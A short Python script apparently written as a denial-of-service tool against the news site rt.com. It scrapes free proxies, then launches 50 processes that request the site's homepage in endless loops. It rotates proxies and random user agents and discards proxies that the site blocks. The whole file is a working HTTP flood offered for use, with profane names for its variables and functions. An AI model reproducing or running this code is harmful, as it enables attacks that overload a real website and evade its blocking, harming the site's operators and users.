import requests
from fake_useragent import UserAgent
import multiprocessing
import time
from requests_ip_rotator import ApiGateway
from bs4 import BeautifulSoup
from random import randrange

def get_proxies():
    url = 'https://free-proxy-list.net/'
    response = requests.get(url)
    html = BeautifulSoup(response.content, 'html.parser')
    shit = html.find('table', class_="table table-striped table-bordered")
    piss = shit.find('tbody')
    
    table = [dick for dick in (fuck.find_all('td') for fuck in piss.find_all('tr'))]
    proxies = []
    for entry in table:
        ip = entry[0].next
        port = entry[1].next
        proxies += [str(ip) + ':' + str(port)]
    return proxies

def fuckRT(x,proxies):
    totalbytes = 0
    session = requests.Session()
    works = False
    while True:
        if len(proxies) > 0:
            if works == False:
                index = randrange(len(proxies))
                this_proxy = proxies[index]
                proxy = {
                    "http": 'http://'+this_proxy, 
                    "https": 'http://'+this_proxy
                }
                headers = {'User-Agent': UserAgent().random}
            try:
                response = session.get('https://www.rt.com/', timeout=5,headers=headers,proxies=proxy)
                totalbytes += len(response.content)/1000000
                print(str(x)+': '+'<Proxy ['+str(this_proxy) +']'+str(response) + '<Bytes [' + str(len(response.content)/1000000) + '|' + str(totalbytes) + ']>')
                if not response.status_code == 403:
                    works = True
                else:
                    works = False
                    proxies.remove(this_proxy)
            except:
                works = False
                proxies.remove(this_proxy)
                print(str(x)+': '+'<Proxy ['+str(this_proxy) +']> [timeout]')
        else:
            print(str(x)+': [no working proxy]')
            print(str(x)+': [getting new proxies]')
            proxies=get_proxies()
if __name__ == '__main__':  
    proxies=get_proxies()
    print('Proxies: '+str(proxies))
    processes = range(50)
    for x in processes:
        process = multiprocessing.Process(target=fuckRT,args=(x,proxies))
        process.start()
        time.sleep(0.1)
    while(1):
        time.sleep(1000)
